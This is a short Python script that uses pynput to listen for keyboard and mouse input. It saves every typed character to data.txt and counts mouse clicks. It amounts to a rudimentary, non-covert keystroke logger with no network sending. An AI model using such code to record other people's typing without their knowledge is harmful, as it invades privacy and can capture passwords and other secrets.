
import threading
import time
import pyautogui
from pynput import keyboard, mouse
# from pynput.mouse import Listener

keyboard_counter = 0
mouse_counter = 0
keys = ""
# Keyboard event handler
def on_press(key):
    global keyboard_counter
    global keys
    keyboard_counter += 1
    try: 
        print('Key {0} pressed'.format(key.char))
        keys += key.char
        append_data(keys)
        print(keys)
    except AttributeError:
        print('Special key {0} pressed'.format(key))
        if key == keyboard.Key.space:
            keys += " " 
            append_data(keys)
        else:    
            keys += '*'
            append_data(keys)
        print(keys)

def append_data(data):
    with open("data.txt", "w") as f:
        f.write(data + "")
def on_click(x, y, button, pressed):
    global mouse_counter
    if pressed:
        mouse_counter = mouse_counter +1
        print(mouse_counter)
        # with open("m.txt", "a") as f:
        #     f.write("1")
def print_hello():
    listener = mouse.Listener(on_click=on_click)
    listener.start()
    listener.join()


def print_world():
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    keyboard_listener.join()
    # while True:
    #     print('5')
    #     time.sleep(4)



if __name__ == "__main__":
    t1 = threading.Thread(target=print_hello)
    t2 = threading.Thread(target=print_world)
    
    t1.start()
    t2.start()